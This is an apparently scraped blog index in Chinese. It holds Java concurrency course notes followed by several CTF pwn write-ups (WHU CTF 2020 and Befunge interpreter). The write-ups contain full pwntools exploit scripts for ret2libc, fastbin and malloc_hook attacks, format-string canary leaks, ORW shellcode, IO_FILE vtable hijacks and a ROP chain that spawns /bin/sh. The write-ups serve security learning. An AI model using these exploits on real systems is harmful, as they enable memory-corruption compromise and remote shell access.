以注释的形式撰写线程安全策略 (ThreadSafe Argument) ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:6:1","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Context 进程与线程 进程(Process)：粒度大，私有空间，彼此隔离 ，拥有整台计算机的资源，用fork创建新进程 线程(Thread)：粒度小，是程序内部的控制机制，多个线程共用一块内存 进程=虚拟机；线程=虚拟CPU 多进程之间不共享内存 ，只能通过消息传递进行协作 多线程之间会自动共享内存 ，也可以创建消息队列在线程之间进行消息传递 并行编程的两大模板 内存共享模式：在内存中读写共享数据 两个处理器，共享内存 ;同一台机器上的两个程序，共享文件系统 ;同一个Java程序内的两个线程，共享Java对象 消息传递模式：通过channel交换消息 网络上的两台计算机，通过网络连接通讯 ;浏览器和Web服务器， A请求页面， B发送页面数据给A;即时通讯软件的客户端和服务器;同一台计算机上的两个程序，通过管道连接进行通讯 Shared memory Message passing 线程的创建和启动， runnable 方法一：继承Thread类，重写Thread.run()即可开启新进程 public class HelloThread extends Thread { // 只需重写run方法 public void run() { System.out.println(\"Hello from a thread!\"); } //启动该线程的两个方式 public static void main(String args[]) { HelloThread p = new HelloThread(); p.start(); } public static void main(String args[]) { (new HelloThread()).start(); } } 方法二：实现Runnable.run()，注意Runnable类启动线程的方式 public class HelloRunnable implements Runnable { public void run() { System.out.println(\"Hello from a thread!\"); } public static void main(String args[]) { // 启动线程 (new Thread(new HelloRunnable())).start(); } } // 也可简写 new Thread(new Runnable() { public void run() { System.out.println(\"Hello\"); } }).start(); 注意上述代码，写的是Runnable.run()，调用的是Thread.start()。也很容易理解，如果直接调用Thread.run()它只会打印，可以看出start()中包含了启动线程的所有底层操作，其中也会调用run()来执行用户操作 时间分片、交错执行、竞争条件 虽然有多线程，但只有一个核，每个时刻只能执行一个线程；即使是多核CPU，进程/线程的数目也往往大于核的数目；通过时间分片，在多个进程/线程之间共享处理器，它是由OS自动调度的。下图为两核三线程的例子，可以看到多个线程是交错执行的。 条件竞争的产生原因：单行、单条语句都未必是原子的 （是否原子，由JVM确定 ） private static int x = 1; public static void methodA() { x *= 2; x *= 3; } public static void methodB() { x *= 5; } // x *= 2的原子操作为： // 1.取出x放入寄存器 // 2.寄存器值*2 // 3.将寄存器的值写回x // // 并行运行A、B，最终x可能为5，6，10，30 // 5：B取出x=1 ---\u003e A方法执行结束 ---\u003e B寄存器值*5 ---\u003e 写回x=5 // 6: A执行x*=2后x=2 ---\u003e A取出x=2 ---\u003e B方法执行结束 ---\u003e A寄存器值*3 ---\u003e 写回x=6 // 10: A执行x*=2后x=2 ---\u003e B取出X=2 ---\u003e A方法执行x*=3 ---\u003e B寄存器值*5 ---\u003e 写回x=10 // 30: 顺序执行即可 由于发送者在等待接受消息时并没有停止工作，所以消息传递机制也无法解决竞争条件问题 很常见的问题就是Iterator，不能在用Iterator遍历的时候调用remove() 线程的休眠、中断 Thread.sleep(time) 调用方法的进程休眠time毫秒 t.interrupt() 调用方法的进程向t进程发送中断信号 t.isInterrupted() 检查t是否收到中断信号(中断位是否置上) Thread.interrupted() 检测调用方法的进程中断位是否置上，并会将中断位清零 但进程接收到中断信号并不会立即中断。正常运行期间，即使接收到中断信号，也不理会 ！ class Task implements Runnable{ private double d = 0.0; public void run() { try{ while (true) { // 正常运行时就算接收到中断信号也不理会，继续执行 for (int i = 0; i \u003c 900000; i++) d = d + (Math.PI + Math.E) / d; // 直到sleep()时才会检测是否收到中断信号，如果收到则自动抛出中断异常 Thread.sleep(500); // 或者直接用Thread.interrupted或者isInterrupted检测 //if (Thread.interrupted()) { // throw new InterruptedException(); //} } //进入异常处理执行return后，线程才真正终止 } catch(InterruptedException e) {return;} } } Thread t = new Thread(new Task()); t.start(); Thread.sleep(100); //当前线程休眠 t.interrupt(); //试图中断t线程 需要注意的是，interrupt本身不会直接结束线程，它只是发个信号，在待中断线程中使用sleep或isInterrupted() 接受这个信号并抛出异常，并在异常处理中return才会结束这个进程 t.join() 调用方法的进程暂停，直到进程t执行结束 public class JoinExample2 { // 三个进程操作之间的执行次序并不确定 public static void main(String[] args) { Thread th1 = new Thread(new MyClass2(), \"th1\"); Thread th2 = new Thread(new MyClass2(), \"th2\"); Thread th3 = new Thread(new MyClass2(), \"th3\"); th1.start(); th2.start(); th3.start(); } } // 三个进程操作执行次序确定，th1所有操作顺序执行结束 --\u003e th2... --\u003e th3... public class JoinExample { public static void main(String[] args) { Thread th1 = new Thread(new MyClass(), \"th1\"); Thread th2 = new Thread(new MyClass(), \"th2\"); Thread th3 = new Thread(new MyClass(), \"th3\"); th1.start(); try { // main进程不会继续执行，直到th1执行结束 // join过程中也会接受中断信号并自动抛出异常 th1.join(); } catch (InterruptedException ie) {} th2.start(); try { th2.join(); } catch (InterruptedException ie) {} th3.start(); try { th3.join(); } catch (InterruptedException ie) {} } } 线程安全threadsafe的四种策略 Confinement、 Immutability、 ThreadSafe类型、Synchronization/Lock Confinement Confinement：限制数据共享 核心思想：线程之间不共享mutable数据类型、避免全局变量 将可变数据限制在单一线程内部，避免竞争，不允许任何其他线程直接读写该数据 除非知道线程访问的所有数据，否则Confinement无法彻底保证线程安全 Immutability Immutability ：共享数据为不可变类型、或是只能读不能写 鸡肋 Using Threadsafe Types Data 如果必须要用mutable的数据类型在多线程之间共享数据，要使用线程安全的数据类型。 一般来说，JDK同时提供两个相同功能的类，一个是threadsafe，另一个不是。原因： threadsafe的类一般性能上受影响 比如集合类都是线程不安全的。Java API提供了进一步的decorator。对它们的每","date":"2020-06-08","objectID":"/2020/06/software-engineering/:6:2","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["PWN"],"content":"赛场http://iwhu.info/ 武大萌新赛（whu的萌新已经强大到这种地步了嘛 虽然题目大部分还算基础，但还是有很多新姿势的。 ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:0:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"pwnpwnpwn 常规的ret2libc，给了lib版本 from pwn import * context.log_level = 'debug' # io = process(\"./pwn\") io = remote(\"218.197.154.9\" ,10004) elf = ELF(\"./pwn\") libc = ELF(\"./libc-2.23.so\") payload = 0x88*'a'+p32(0x804A020+0x500) + p32(elf.plt['write']) + p32(0x804843B) payload += p32(1)+ p32(elf.got['write']) io.sendlineafter(\"Ready?\\n\",payload) write_addr = u32(io.recv(4)) libc_base = write_addr - libc.sym['write'] print hex(libc_base) sys_addr = libc_base + libc.sym['system'] bin_sh = libc_base + libc.search(\"/bin/sh\").next() payload = 0x8c*'a'+p32(sys_addr) + 'a'*4 + p32(bin_sh) io.sendlineafter(\"Ready?\\n\",payload) io.interactive() WHUCTF{welc0me_t0_pwn_woRld} ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:1:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"FFF delete功能里明显可以uaf。不让改got，保护全开，估计得改malloc_hook 通过unsorted bin 泄露lib，然后fastbin 打到malloc_hook即可，数据错位得到0x7f ，请求0x60 即可 #coding:utf-8 from pwn import * # import pwn_framework as pf from time import sleep import sys global io ru = lambda p, x : p.recvuntil(x) sn = lambda p, x : p.send(x) rl = lambda p : p.recvline() sl = lambda p, x : p.sendline(x) rv = lambda p, x : p.recv(numb = x) sa = lambda p, a,b : p.sendafter(a,b) sla = lambda p, a,b : p.sendlineafter(a,b) rr = lambda p, t : p.recvrepeat(t) # amd64 or x86 context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] filename = \"./pwn\" ip = \"218.197.154.9\" port = 10007 LOCAL = True if len(sys.argv)==1 else False global bps # Break Points global gds # Gdb Debug Symbols bps = [] gds = {} elf = ELF(filename) remote_libc = \"./libc-2.23.so\" if LOCAL: io = process(filename) # io = process(filename,aslr=False) libc = elf.libc # # if LD_PRELOAD multiple libs, split with ':' # io = process(filename, env={'LD_PRELOAD': remote_libc}) #libc = ELF(remote_libc) else: context.log_level = 'debug' io = remote(ip, port) # libc = elf.libc libc = ELF(remote_libc) def mydebug(p, s=''): def _get_bstr(): global bps b_str =\"\" for break_point in bps: if type(break_point) == int: b_str += \"b *%s\\n\"%(hex(break_point)) elif type(break_point) == str: b_str += \"b %s\\n\"%(break_point) else: pause(p, \"[_get_bstr] unsupported break point type : \"+str(break_point)) return b_str def _get_gds_str(): global gds res = \"\" for name in gds: val = gds[name] if type(name) != str: pause(p, \"[_get_gds_str] unsupported name type : \"+str(type(name))) if type(val) != int: pause(p, \"[_get_gds_str] unsupported val type : \"+str(type(val))) res += \"set $%s=%d\\n\"%(name, gds[name]) return res if not LOCAL: return gdb.attach(p, _get_bstr()+_get_gds_str()+s) def pause(p, s = 'pause'): if LOCAL: print('pid: ' + str(p.pid)) return raw_input(s) else: return raw_input(s) def choice(p, idx): sla(p, XXX, str(idx)) def lg(name, val): log.info(name+\" : \"+hex(val)) def add(size): sla(io,\"\u003e \",\"1\") sla(io,'size?',str(size)) def edit(idx,size,con): sla(io,\"\u003e \",\"2\") sla(io,'index?',str(idx)) sla(io,'size?',str(size)) sn(io,con) def show(idx): sla(io,\"\u003e \",\"3\") sla(io,'index?\\n',str(idx)) def free(idx): sla(io,\"\u003e \",\"4\") sla(io,'index?',str(idx)) pause(io) add(0x100)#0 add(0x60)#1 free(0) show(0) malloc_hook = u64(rv(io,6)+\"\\x00\"+'\\x00') - 0x68 lg(\"malloc_hook:\",malloc_hook) lg(\"libc:\",libc_base) gadget = 0x4526a + libc_base # 0x45216 execve(\"/bin/sh\", rsp+0x30, environ) # constraints: # rax == NULL # 0x4526a execve(\"/bin/sh\", rsp+0x30, environ) # constraints: # [rsp+0x30] == NULL # 0xf02a4 execve(\"/bin/sh\", rsp+0x50, environ) # constraints: # [rsp+0x50] == NULL # 0xf1147 execve(\"/bin/sh\", rsp+0x70, environ) # constraints: # [rsp+0x70] == NULL target_chunk = libc_base + 0x155555328b05 - 0x155554f64000 - 0x18 print(hex(target_chunk)) add(0x20)#2 free(1) edit(1,0x60,p64(target_chunk)) add(0x60)#3 add(0x60)#4 payload = 'a'*(malloc_hook-target_chunk-0x10) + p64(gadget) edit(4,len(payload),payload) add(0x8) io.interactive() WHUCTF{FFFFFFFFFFFFFFastbin_Attack_5e58440652e52e354ae12af8775bec97} ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:2:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"arbitrary f1() 输入一个地址实现任意地址写入八字节数，f2()有金丝雀的栈溢出。 f3() 格式化字符串漏洞，_printf_chk 会过滤掉$，得手动调了 输入多个%p 找到位置，进而泄露libc ，还意外的泄露了canary 这题被官网write up误导了，read不会产生\\x00输入截断，直接输入金丝雀就行。本地不知道为什么没打通，不过这题也没啥营养了。 from pwn import * context.log_level='debug' r=process('./pwn',aslr = False) context(arch = 'amd64', os = 'linux', endian = 'little') libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") gdb.attach(r,\"b *0x555555554B80\") # C01 def f2(buf): r.sendlineafter(\"choice\u003e\u003e\",'2') r.sendlineafter(\"input data:\\n\",'a'*8) r.sendlineafter(\"input data:\\n\",buf) def f3(string): r.sendlineafter(\"choice\u003e\u003e\",'3') r.sendlineafter(\"input data:\\n\",string) f3(\".%p\"*10+\".\") # 6-ca7 -\u003e elf_base 10-240 __libc_start_main 8 -\u003e canary for i in range(6): r.recvuntil(\".\") elf_base = int(r.recvuntil(\".\",drop=True),16) - 0xca7 r.recvuntil(\".\") canary = int(r.recvuntil(\"0a.\",drop=True)+'00',16) r.recvuntil(\".\") __libc_start_main = int(r.recvuntil(\".\",drop=True),16) - 240 libc_base = __libc_start_main - libc.sym['__libc_start_main'] success(\"elf_base:\"+hex(elf_base)) success(\"libc_base\"+hex(libc_base)) success(\"canary:\"+hex(canary)) f2(\"b\"*0x38+p64(canary)+p64(0x202520+elf_base)+p64(0xC08+elf_base)) f3(asm(shellcraft.sh())) f2(\"b\"*0x38+p64(canary)+p64(0x202020+elf_base)+p64(0x202060+elf_base)) # 0x202060+elf_base r.interactive() WHUCTF{Do_yOu_kNow_canary} ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:3:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"shellcode 沙盒逃逸（？）的orw ，这里参考了一下民间答案,用到getdents 扫描服务器文件夹，找到flag位置。不能直接用sh貌似是因为mprotect （？） int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count); // 从文件描述符fd中读取长度为count的内容到dirp所指的区域 第一阶段扫描整个目录，先open 得到的fd会存放在rax中，然后getdents扫描存放在rsp 中，然后write 出来 shellcode = shellcraft.open(\"./\",0x10000) shellcode += shellcraft.getdents(\"rax\",\"rsp\",0x300) shellcode += shellcraft.write(1,\"rsp\",0x300) 可以看到结果可以勉强辨认，与当前文件夹内容相同（本地测试） 拿到服务器上跑，可以发现有个FFFFFFFFFlag文件夹，进一步解析这个文件夹发现flag在里面，打印出来即可 payload = shellcraft.open(\"./FFFFFFFFFlag/flag\",0) payload += shellcraft.read(\"rax\",\"rsp\",0x300) payload += shellcraft.write(1,\"rsp\",0x300) 可以看到read 只能读取文件，而getdents 能读取文件夹 WHUCTF{ORWOWRROWRWOWORWRO_779243c8c5097c6920d52b79d31f0d4a} ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:4:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"attention uaf+fastbin attack打got表，构造chunk size即可，比较简单。 #coding:utf-8 from pwn import * # import pwn_framework as pf from time import sleep import sys global io ru = lambda p, x : p.recvuntil(x) sn = lambda p, x : p.send(x) rl = lambda p : p.recvline() sl = lambda p, x : p.sendline(x) rv = lambda p, x : p.recv(numb = x) sa = lambda p, a,b : p.sendafter(a,b) sla = lambda p, a,b : p.sendlineafter(a,b) rr = lambda p, t : p.recvrepeat(t) # amd64 or x86 context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] filename = \"./pwn\" ip = \"218.197.154.9\" port = 10002 LOCAL = True if len(sys.argv)==1 else False global bps # Break Points global gds # Gdb Debug Symbols bps = [] gds = {} elf = ELF(filename) remote_libc = \"./libc-2.23.so\" if LOCAL: io = process(filename) # io = process(filename,aslr=False) libc = elf.libc # # if LD_PRELOAD multiple libs, split with ':' # io = process(filename, env={'LD_PRELOAD': remote_libc}) #libc = ELF(remote_libc) else: context.log_level = 'debug' io = remote(ip, port) # libc = elf.libc libc = ELF(remote_libc) def mydebug(p, s=''): def _get_bstr(): global bps b_str =\"\" for break_point in bps: if type(break_point) == int: b_str += \"b *%s\\n\"%(hex(break_point)) elif type(break_point) == str: b_str += \"b %s\\n\"%(break_point) else: pause(p, \"[_get_bstr] unsupported break point type : \"+str(break_point)) return b_str def _get_gds_str(): global gds res = \"\" for name in gds: val = gds[name] if type(name) != str: pause(p, \"[_get_gds_str] unsupported name type : \"+str(type(name))) if type(val) != int: pause(p, \"[_get_gds_str] unsupported val type : \"+str(type(val))) res += \"set $%s=%d\\n\"%(name, gds[name]) return res if not LOCAL: return gdb.attach(p, _get_bstr()+_get_gds_str()+s) def pause(p, s = 'pause'): if LOCAL: print('pid: ' + str(p.pid)) return raw_input(s) else: return raw_input(s) def choice(p, idx): sla(p, XXX, str(idx)) def lg(name, val): log.info(name+\" : \"+hex(val)) def add(): sla(io,\"your choice :\\n\",\"1\") def edit(name,data): sla(io,\"your choice :\\n\",\"2\") sa(io,'name:\\n',name) sla(io,'data:\\n',data) def show(): sla(io,\"your choice :\\n\",\"4\") def free(): sla(io,\"your choice :\\n\",\"3\") pause(io) # mydebug(io,\"b *0x0400906\") fake_chunk = 0x06010A0 for i in range(0x40): add() free() edit(p64(fake_chunk),'b') add() add() edit(p64(elf.got['atoi']),'c') show() ru(io,\"name:\") atoi_addr = u64(rv(io,6)+'\\x00\\x00') libc_base = atoi_addr - libc.sym['atoi'] lg(\"base:\",libc_base) sys = libc_base + libc.sym['system'] edit(p64(sys),'d') sla(io,\"your choice :\\n\",\"/bin/sh\") io.interactive() WHUCTF{Should_You_Attack_Bss} ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:5:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"overflow 考察IO FILE。一般都是打scanf 之类的函数，这题可以直接在bss 伪造整个IO FILE，把vtable填充为one_gadget地址，令stdout 指向这个FILE结构体便能跳转到shell。 这题花的时间最长还是没有解决，不太清楚IO FILE结构体哪些东西需要赋值为哪些特殊的值才能通过检测，又得看源码了吗/(ㄒoㄒ)/ 最骚的是跑官方wp可以跑通，一挂上gdb就崩，导致无法调试，擦这什么神必题目 https://xz.aliyun.com/t/2608 可以按照2018网鼎杯Lilac提供的blind题解（葵佬nb！）构造IO_FILE 令vtable指向addr+240 ，然后在addr+240中构造虚表，把 xsputn 位置改为one_gadget就能在下次调用printf 的时候getshell void * funcs[] = { 1 NULL, // \"extra word\" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf ... } exp如下： from pwn import * context.log_level = 'debug' io = process(\"./pwn\",aslr=False) # io = remote(\"218.197.154.9\",10006) elf = ELF(\"./pwn\") # libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") context.terminal = ['tmux', 'splitw', '-h'] gdb.attach(io,\"b *0x555555554B60\") def rread(offset): io.sendlineafter(\"Choice:\",\"1\") io.sendlineafter(\"Offset:\\n\",str(offset)) def wwrite(offset,size,data): io.sendlineafter(\"Choice:\",\"2\") io.sendlineafter(\"Offset:\\n\",str(offset)) io.sendlineafter(\"Size:\\n\",str(size)) io.sendlineafter(\"Input data:\\n\",data) io.recvuntil(\"Gift:\\n\") addr = int(io.recv(14),16) elf_base = addr - 0x202060 success(\"elf_base:\"+hex(elf_base)) rread(-0x40) io.recvuntil(\"This is your data:\\n\") libc_base = u64(io.recv(6)+'\\x00\\x00')-0x7f2f223cb620+0x7f2f22006000 success(\"libc_base:\"+hex(libc_base)) payload = p64(0xfbad8800)+p64(addr)*7 payload += p64(addr+1)+p64(0)*4+p64(addr)+p64(1) payload += p64(0xffffffffffffffff)+p64(0)+p64(addr)+p64(0xffffffffffffffff) payload += p64(0)+p64(addr)+p64(0)*3+p32(0xffffffff)+p32(0)+p64(0)*2+p64(addr+240) payload += p64(0)*7 + p64(libc_base + 0x4526a) print(len(payload)) wwrite(0, \"-1\", payload) io.recv() io.sendline(\"2\") io.recv() io.sendline(\"-48\") io.recv() io.sendline(str(8)) io.recv() io.sendline(p64(addr)) WHUCTF{Bss_Overflow_And_File_Struct_Exploitation} ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:6:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"heaptrick 进阶堆技巧+fsop，mark 打global_max_fast ，让fastbin 的最大大小变大，而free堆块后，系统根据fastbin大小的不同，在main_arena的fastbinY数组中填入被free堆块的地址。例如size=0x20的fastbin地址填在main_arena+8，0x30的fastbin地址填在main_arena+16……直到0x80的fastbin在main_arena+56。 设fastbinsize的堆块放在main_arena+offset位置，推出公式为： fastbinsize=2*(offset+8) 所以可以打到main_arena后面的某些数据，让其指向某个堆块。这里选择打_IO_list_all ，为_IO_FILE数组的头指针，位于main_arena+0xa00； 当系统执行exit(0)时调用_IO_flush_all_lockp函数，该函数寻找下一个_IO_FILE结构体，将调用该结构体vtable中的_IO_OVERFLOW函数 (位于vtable+0x18处)，虚表见上 详情参考https://docs.qq.com/doc/DUGp2TFBBb1hFRm11?pub=1\u0026dver=2.1.0 from pwn import * env=os.environ env['LD_PRELOAD']='./heaptrick.so' context.log_level='debug' #r=process('./heaptrick') r=remote('218.197.154.9',10003) def add(size,cont): r.recvuntil('exit\\n') r.sendline('1') r.recvuntil(':') r.sendline(str(size)) r.recvuntil(':') r.sendline(cont) def delete(idx): r.recvuntil('exit\\n') r.sendline('2') r.recvuntil(':\\n') r.sendline(str(idx)) def edit(cont): r.recvuntil('exit\\n') r.sendline('3') r.recvuntil(':') r.sendline(cont) #step 1:leak elfbase and libc r.recvuntil('exit\\n') r.sendline('666') elfbase=int(r.recvline()[:-1],16)-0x202040 bsscomment=elfbase+0x2020e0 success(\"elfbase:\"+hex(elfbase)) add(0xa0,'0'*0xa0)#0 add(0xa0,'1'*0xa0)#1 fakefile=p64(0)*3+p64(1)+p64(0)*21+p64(bsscomment-0x18) #fakesize=2*(\u0026_IO_list_all-\u0026main_arena+8)-0x10=0x1400 fakesize=0x1400 add(fakesize,fakefile)#2 delete(0) add(0xa0,'2'*7)#0 r.recvuntil('2'*7+'\\n') leak=u64(r.recvline()[:-1].ljust(8,'\\x00')) success(\"leak:\"+hex(leak)) lbase=leak-0x7ffff7dd1b78+0x7ffff7a0d000 global_max_fast=leak-0x7ffff7dd1b78+0x7ffff7dd37f8 _IO_list_all=leak-0x7ffff7dd1b78+0x7ffff7dd2520 one=lbase+0x4526a success(\"lbase:\"+hex(lbase)) success(\"maxfast:\"+hex(global_max_fast)) success(\"io:\"+hex(_IO_list_all)) #step 2:overwrite global_max_fast with big value edit(p64(one)+p64(0)*3+p64(global_max_fast)) #step 3:free fake chunk and change _IO_list_all to fake chunk delete(2) #step 4:call exit and go to _IO_flush_all_lockp r.recvuntil('exit\\n') r.sendline('4') r.interactive() WHUCTF{Nice_Heap_Tricks!!!} 个人感觉不需要打IO_FILE，可以直接打free_hook ，然后在堆中填充shellcode即可 ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:7:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"好不容易打进rank3，随手记录一下近期做过的三道比较繁琐的高分题吧 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:0:0","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"Befunge ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:1:0","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"漏洞解析 8分题，是一道比较有意思的虚拟机pwn。该程序模拟了一个Befunge语言的解释器 Befunge的代码是二维的。它用 \u003c \u003e v ^ 这四个符号来控制一个指针在代码中移动，指针经过一个字符或数字则把它压入一个栈，四则运算符号的功能就是弹出栈顶两个元素进行计算后把结果压回去。用 _ 和 | 来表示有条件的方向选择：当栈顶元素为0时向右（上）走，否则向左（下）走。\u0026 和 ~ 分别用于读入数字或字符并压入栈，句号和逗号分别表示将栈顶元素作为整数或字符输出。最后以一个@符号表示程序结束。 保护全开，根据提示是一个Befunge93解释器，查阅一些资料（[1], [2],[3]） # pwn @ ubuntu in /mnt/hgfs/adworld [3:39:33] C:1 $ ./interpreter-200 Welcome to Online Befunge(93) Interpreter Please input your program. \u003e 耐心逆一下可以发现确实如此，program[2000]按二维组织成$25*80$。 代码上下左右移动靠下面的跳转表实现。 .rodata:00000000000014E0 ; _DWORD dword_14E0[4] .rodata:00000000000014E0 dword_14E0 dd 0, 1, 0, 0FFFFFFFFh ; DATA XREF: main+520↑o .rodata:00000000000014F0 ; _DWORD dword_14F0[4] .rodata:00000000000014F0 dword_14F0 dd 1, 0, 0FFFFFFFFh, 0 ; DATA XREF: main+536↑o 每次读取代码后依据方向改变下一次读取位置，其中x为行数，y为列数，就像走迷宫一样。 /*执行方向 0-右 1-下 2-左 3-上 */ prog_x += dword_14E0[direction]; v30 = prog_y + dword_14F0[direction]; prog_y += dword_14F0[direction]; if ( prog_x == -1 ) // 25*80的program矩阵 { prog_x = 24; } else if ( prog_x == 25 ) { prog_x = 0; } if ( v30 == -1 ) { prog_y = 79; } else if ( prog_y == 80 ) { prog_y = 0; } 注意到program数组是char，stack数组是QWARD，所以pop和push都是int64类型，所以漏洞点也比较明显，在主函数中g与p都能越界，这样便可以任意地址读写，布置rop链即可。 case 'g': v26 = pop(); v27 = pop(); push(program[80 * v26 + v27]); break; case 'p': v28 = pop(); v29 = pop(); program[80 * v28 + v29] = pop(); break; 这里我们需要泄露很多东西，got表里有puts_ptr和program_ptr，我们可以泄露elf_base和libc_base，由于要布置ROP链，也需要拿到一个栈指针，这里也是先拿到libc地址，然后用environ变量拿到栈指针。 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:1:1","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"漏洞利用 总体来说在进阶区里还是算比较难的题，逆向和漏洞利用工作量都不小。exp如下 from pwn import * context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] io = process(\"./interpreter-200\") #io = remote(\"220.249.52.134\",33610) #gdb.attach(io,\"b *0xE05+0x555555554000\") # 0x202040 -\u003e 0x201F50 gdb.attach(io,\"b *0x1203+0x555555554000\") program = \"\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\" # leak puts_addr program += \"\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\" #leak elf_addr program = program.ljust(79, \" \") + \"v\\n\" program += \"v\" + \" \"*78 + \"\u003c\\n\" program += \"\u003e\u0026\u0026\u0026*\u0026+g,\u0026\u0026\u0026*\u0026+g,\u0026\u0026\u0026*\u0026+g,\u0026\u0026\u0026*\u0026+g,\u0026\u0026\u0026*\u0026+g,\u0026\u0026\u0026*\u0026+g,\".ljust(79, \" \") + \"v\\n\"# leak stack_addr program += \"v\" + \" \"*78 + \"\u003c\\n\" program += (\"\u003e\" + \"\u0026\u0026\u0026\u0026*\u0026+p\"*8).ljust(79, \" \") + 'v\\n' # ROP exploit program += \"v\" + \" \"*78 + \"\u003c\\n\" program += (\"\u003e\" + \"\u0026\u0026\u0026\u0026*\u0026+p\"*8).ljust(79,\" \") + 'v\\n' program += \"v\" + \" \"*78 + \"\u003c\\n\" program += \"\u003e\" + \"\u0026\u0026\u0026\u0026*\u0026+p\"*8 + '\u003e\u003c' io.sendline(program.ljust(2000,'@')) for i in range(6): io.sendline(str(i)) io.sendline(\"-3\") #for i in range(6): # io.sendline(str(i+0x28)) # io.sendline(\"-3\") for i in range(-16, -10): io.sendline(str(i)) io.sendline(\"-1\") io.recvuntil(\"\u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \") puts_addr = u64(io.recv(6)+'\\x00\\x00') #fgets_addr = u64(io.recv(6)+'\\x00\\x00') #success(len(io.recv(6))) progbuf_addr = u64(io.recv(6)+'\\x00\\x00') libc_base = puts_addr - 0x6F690 environ = libc_base + 0x3c6f38 elf_base = progbuf_addr - 0x202040 success(hex(elf_base)) success(hex(environ)) success(hex(libc_base)) #raw_input() x = (environ - elf_base - 0x202040) / 80 y = (environ - elf_base - 0x202040) % 80 x_1 = x / 50000 x_2 = x % 50000 for i in range(6): io.sendline(str(y+i)) io.sendline(str(x_1)) io.sendline(str(50000)) io.sendline(str(x_2)) stack_addr = '' for i in range(6): stack_addr += io.recv(1) stack_addr = u64(stack_addr+'\\x00\\x00') success(hex(stack_addr)) rop_target = stack_addr - 0x128 + 0x38 raw_input() offset = rop_target - progbuf_addr prdir = 0x120c + elf_base binsh_addr = libc_base + 0x18cd57 system_addr = libc_base + 0x045390 context.log_level = 'info' # write(progbuf_addr + offset, value, 8) def edit(offset, value): x = offset / 80 y = offset % 80 x_1 = x / 50000 x_2 = x % 50000 success(x_1) success(x_2) success(y) success(hex(value)) for i in range(8): val = value \u0026 0xff value = value \u003e\u003e 8 success(\"round{}: val:{}| y:{}| x_1:{}| x_2:{}| write at:{}\".format(i, hex(val), y+i, x_1, x_2, hex((x_1*50000+x_2)*80+y+i+progbuf_addr))) io.sendline(str(val)) io.sendline(str(y+i)) io.sendline(str(x_1)) io.sendline(str(50000)) io.sendline(str(x_2)) edit(offset, prdir) edit(offset+8, binsh_addr) edit(offset+16, system_addr) io.interactive() 成功与服务器交互 [+] 11470264 [+] 27054 [+] 56 [+] 0x56434fd4f20c [+] round0: val:0xc | y:56 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ed8 [+] round1: val:0xf2 | y:57 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ed9 [+] round2: val:0xd4 | y:58 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eda [+] round3: val:0x4f | y:59 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edb [+] round4: val:0x43 | y:60 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edc [+] round5: val:0x56 | y:61 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edd [+] round6: val:0x0 | y:62 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ede [+] round7: val:0x0 | y:63 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edf [+] 11470264 [+] 27054 [+] 64 [+] 0x7f9040bcfd57 [+] round0: val:0x57 | y:64 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee0 [+] round1: val:0xfd | y:65 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee1 